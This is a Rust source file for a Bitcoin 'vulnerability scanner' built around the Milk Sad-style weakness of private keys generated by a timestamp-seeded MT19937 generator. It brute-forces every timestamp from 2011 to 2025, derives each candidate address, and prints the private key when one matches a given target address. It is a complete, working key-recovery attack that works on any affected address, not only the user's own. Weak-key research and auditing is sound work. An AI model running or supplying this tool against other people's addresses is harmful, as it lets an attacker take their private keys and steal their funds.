use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use tracing::{info, warn};

/// Generic "Ec-New" Scanner
/// Vulnerability: Private key generated directly from PRNG (MT19937) seeded with timestamp
/// Similar to Milk Sad, but without BIP39 mnemonic step.
/// Use: bx ec-new (with weak RNG)
pub fn run(target_address: &str, start_ts: Option<u32>, end_ts: Option<u32>) -> Result<()> {
    info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");

    // Default range: 2011-2024 if not specified
    let start = start_ts.unwrap_or(1300000000);
    let end = end_ts.unwrap_or(1735689600); // Jan 1 2025

    info!("Target: {}", target_address);
    info!("Time range: {} to {} ({} seconds)", start, end, end - start);

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;

    let target_addr_obj = target_address
        .parse::<Address<_>>()
        .map_err(|e| anyhow!("Invalid target address: {}", e))?
        .require_network(network)?;

    let mut found = false;
    let start_time = std::time::Instant::now();
    let mut checked = 0u64;

    for t in start..=end {
        // Generate 32 bytes of "randomness" from MT19937 seeded with timestamp
        let entropy_32 = generate_mt19937_32bytes(t);

        // 2. Treat as Private Key
        if let Ok(sk) = SecretKey::from_slice(&entropy_32) {
            let pk = PublicKey::from_secret_key(&secp, &sk);
            let address = Address::p2pkh(CompressedPublicKey(pk), network);

            if address == target_addr_obj {
                warn!("\n🎯 FOUND MATCH!");
                warn!("Timestamp: {}", t);
                warn!("Private Key: {}", hex::encode(entropy_32));
                warn!("Address: {}", address);
                found = true;
                break;
            }
        }

        checked += 1;
        if checked.is_multiple_of(1_000_000) {
            let elapsed = start_time.elapsed().as_secs_f64();
            info!(
                "Checked {} timestamps ({} M/s)",
                checked,
                checked as f64 / elapsed / 1_000_000.0
            );
        }
    }

    if found {
        info!("Scan complete. VULNERABILITY FOUND.");
    } else {
        info!("Scan complete. No match found in range.");
    }

    Ok(())
}

// MT19937 implementation customized for 32 bytes (8 words)
// Using MSB extraction (matching Libbitcoin behavior observed in Milk Sad)
fn generate_mt19937_32bytes(seed: u32) -> [u8; 32] {
    // We can use the 'rand_mt' crate or copy logic.
    // Copy logic for speed/control.
    let mut mt = Mt19937::new(seed);
    let mut bytes = [0u8; 32];

    for i in 0..8 {
        let val = mt.next_u32();
        // MSB extraction (Big Endian-ish)
        bytes[i * 4] = (val >> 24) as u8;
        bytes[i * 4 + 1] = (val >> 16) as u8;
        bytes[i * 4 + 2] = (val >> 8) as u8;
        bytes[i * 4 + 3] = val as u8;
    }
    bytes
}

struct Mt19937 {
    mt: [u32; 624],
    index: usize,
}

impl Mt19937 {
    fn new(seed: u32) -> Self {
        let mut mt = [0u32; 624];
        mt[0] = seed;
        for i in 1..624 {
            let prev = mt[i - 1];
            mt[i] = (1812433253u64 * (prev ^ (prev >> 30)) as u64 + i as u64) as u32;
        }
        Self { mt, index: 624 }
    }

    fn next_u32(&mut self) -> u32 {
        if self.index >= 624 {
            self.twist();
        }
        let mut y = self.mt[self.index];
        self.index += 1;

        y ^= y >> 11;
        y ^= (y << 7) & 0x9d2c5680;
        y ^= (y << 15) & 0xefc60000;
        y ^= y >> 18;

        y
    }

    fn twist(&mut self) {
        for i in 0..624 {
            let y = (self.mt[i] & 0x80000000) + (self.mt[(i + 1) % 624] & 0x7fffffff);
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1);
            if !y.is_multiple_of(2) {
                self.mt[i] ^= 0x9908b0df;
            }
        }
        self.index = 0;
    }
}
